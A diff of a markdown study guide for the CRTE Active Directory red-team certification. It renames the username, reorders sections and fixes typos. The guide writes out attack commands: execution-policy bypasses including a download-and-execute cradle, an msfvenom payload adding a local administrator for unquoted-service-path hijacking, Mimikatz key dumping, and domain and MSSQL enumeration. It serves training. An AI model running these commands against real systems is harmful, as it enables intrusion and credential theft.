@@ -4,9 +4,9 @@ In the journey to CRTE you need to understand the basic methodology to audit an 
 
 ![Pasted image 20220428103516](https://user-images.githubusercontent.com/94725286/177431659-8f09fadf-9f2a-4a93-8c9e-8efdfc9a84f6.png)
 
->:exclamation:Domain Admin is not the only way to own an Active Directory environment.
+>:exclamation: Domain Admin is not the only way to own an Active Directory environment.
 
->:exclamation:CRTE is not a certification oritented to exploit vulnerabilities, is oriented to abuse a missconfigured environment.
+>:exclamation: CRTE is not a certification oritented to exploit vulnerabilities, is oriented to abuse a missconfigured environment.
 
 ## Step 01 - Local enumeration
 
@@ -15,7 +15,7 @@ In a real red team operation, you don't have a high privilege account, you need 
 In many case you have a minimum privileges account, in this case you don't have permission to execute scripts or tools. Is neccessay bypass those controls.
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-ExecutionPolicy
+PS C:\Users\demiidk\Documents\> Get-ExecutionPolicy
 
 Restricted
 ```
@@ -27,7 +27,7 @@ Using InvisiShell you are able to bypass some controls.
 >:warning: InvisiShell must be executed with CMD.
 
 ```
-C:\Users\0xdemiafk\Documments\> RunWithRegistryNonadmin.bat
+C:\Users\demiidk\Documments\> RunWithRegistryNonadmin.bat
 ```
 
 With a InvisiShell terminal you're able to execute or import scripts.
@@ -35,19 +35,19 @@ With a InvisiShell terminal you're able to execute or import scripts.
 A lot of techniques to bypass execution policy can be found on internet.
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-Content .\PowerView.ps1 | PowerShell.exe -noprofile -
+PS C:\Users\demiidk\Documents\> Get-Content .\PowerView.ps1 | PowerShell.exe -noprofile -
 ```
 
 ```
-PS C:\Users\0xdemiafk\Documents\> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://localhost:8080/PowerView.ps1')"
+PS C:\Users\demiidk\Documents\> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://localhost:8080/PowerView.ps1')"
 ```
 
 ```
-PS C:\Users\0xdemiafk\Documents\> PowerShell.exe -ExecutionPolicy UnRestricted -File .PowerView.ps1
+PS C:\Users\demiidk\Documents\> PowerShell.exe -ExecutionPolicy UnRestricted -File .\PowerView.ps1
 ```
 
 ```
-PS C:\Users\0xdemiafk\Documents\> PowerShell.exe -ExecutionPolicy Remote-signed -File .PowerView.ps1
+PS C:\Users\demiidk\Documents\> PowerShell.exe -ExecutionPolicy Remote-signed -File .\PowerView.ps1
 ```
 
 When you are able to import or execute script you can use PowerView or ActiveDirectory module to start to enumerating your system.
@@ -57,8 +57,31 @@ When you are able to import or execute script you can use PowerView or ActiveDir
 ### Enumerating group membership
 
 ```
-PS C:\Users\0xdemiafk\Documents\> whoami /GROUPS
+PS C:\Users\demiidk\Documents\> whoami /GROUPS
 ```
+
+### Importing and executing PowerUp
+
+```
+PS C:\Users\demiidk\Documents\> Import-Module .\PowerUp.ps1; Invoke-AllChecks
+```
+
+### Importing Active Directory Module.
+
+```
+PS C:\Users\demiidk\Documents\> Import-Module .\Microsoft.ActiveDirectory.dll -Verbose
+```
+
+```
+PS C:\Users\demiidk\Documents\> Import-Module .\ActiveDirectory.psd1
+```
+<br>
+
+## Step 02 - Local Privilege Escalation
+
+<br>
+
+>:warning: In some cases is not possible to escalate privilege on the first machine. In this case is necessary enumerate another machines that you can access. Local Admin is a necessary permission to perform some attacks.
 
 ### Enumerating unquoted path services.
 
@@ -67,34 +90,8 @@ PS C:\Users\0xdemiafk\Documents\> whoami /GROUPS
 >Is a miss configuration on the service executable reference. An unquoted path service can be attack replacing the legit executable to a malicious one if an attacker has permission to write on some place of the path. In the order to find for the executable, the operating system tries to execute each block in the path, each space in the executable path delimits a new block.
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-WmiObject -Class win32_service | select pathname
+PS C:\Users\demiidk\Documents\> Get-WmiObject -Class win32_service | select pathname
 ```
-
-### Importing and executing PowerUp
-
-```
-PS C:\Users\0xdemiafk\Documents\> Import-Module PowerUp.ps1; Invoke-AllChecks
-```
-
-
-### Importing Active Directory Module.
-
-```
-PS C:\Users\0xdemiafk\Documents\> Import-Module .\Microsoft.ActiveDirectory.dll -Verbose
-```
-
-```
-PS C:\Users\0xdemiafk\Documents\> Import-Module .\ActiveDirectory.psd1
-```
-### Importing PowerView
-
-```
-PS C:\Users\0xdemiafk\Documents\> .\PowerView.ps1
-```
-
-## Step 02 - Local Privilege Escalation
-
->:warning: In some cases is not possible to escalate privilege on the first machine. In this case is necessary enumerate another machines that you can access. Local Admin is a necessary permission to perform some attacks.
 
 ### Perform an Unquoted Path Service Hijacking
 
@@ -118,19 +115,31 @@ C:\Program Files\Vulnerable service\path to the executable\executable.exe
 Having write privileges on one of those folder, is possible to place an executable with a malicious payload.
 
 ```
-0xdemiafk@root# msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators redteamuser /add" -f exe > path.exe
+demiidk@root# msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators redteamuser /add" -f exe > path.exe
 ```
 
-### Steal local keys with mimikatz (Using local administrator permission)
+### Steal local keys with mimikatz (Using admini strator privilege)
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Import-Module Mimikatz.ps1
+PS C:\Users\demiidk\Documents\> Import-Module .\Mimikatz.ps1
 ```
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Invoke-Mimikarz -Command "'sekurlsa::ekeys'"
+PS C:\Users\demiidk\Documents\> Invoke-Mimikatz -Command "'sekurlsa::ekeys'"
 ```
 
+### Using PowerUp:
+
+```
+PS C:\Users\demiidk\Documents\> import-module .\PowerUP.ps1
+```
+
+```
+PS C:\Users\demiidk\Documents\> Invoke-AllChecks 
+```
+![](2022-10-30-01-51-02.png)
+
+<br>
 
 ## Step 03 - Active Directory enumeration
 
@@ -147,42 +156,42 @@ Enumerate all GPOs using "Restircted Groups"
 > :information_source: A Restricted Group is an object to represent a local group in a computer.
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-DomainGPOLocalGroup
+PS C:\Users\demiidk\Documents\> Get-DomainGPOLocalGroup
 ```
 
 Enumerate all members from a group (Using ADModule).
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-ADGroupMember "Domain Admins" -Recursive
+PS C:\Users\demiidk\Documents\> Get-ADGroupMember "Domain Admins" -Recursive
 
 ```
 
 Enumerate all OUs.
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-DomainOU
+PS C:\Users\demiidk\Documents\> Get-DomainOU
 ```
 
 Enumerate OUs that contains "domain":
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-DomainOU -Identity "*domain*"
+PS C:\Users\demiidk\Documents\> Get-DomainOU -Identity "*domain*"
 ```
 
 Enumerate GPO applied to an OU:
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-DomainGPO -Identity "{FCE16496-C744-4E46-AC89-2D01D76EAD68}"
+PS C:\Users\demiidk\Documents\> Get-DomainGPO -Identity "{FCE16496-C744-4E46-AC89-2D01D76EAD68}"
 ```
 
 Enumerate MSSQL servers and instances:
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-SQLInstanceBroadcast -Verbose
+PS C:\Users\demiidk\Documents\> Get-SQLInstanceBroadcast -Verbose
 ```
 
 Test if MSSQL is accessible:
 
 ```
-PS C:\Users\0xdemiafk\Documents\> Get-SQLConnectionTest -Instance SQLSRV01\SQL -Verbose
+PS C:\Users\demiidk\Documents\> Get-SQLConnectionTest -Instance SQLSRV01\SQL -Verbose
 ```
 
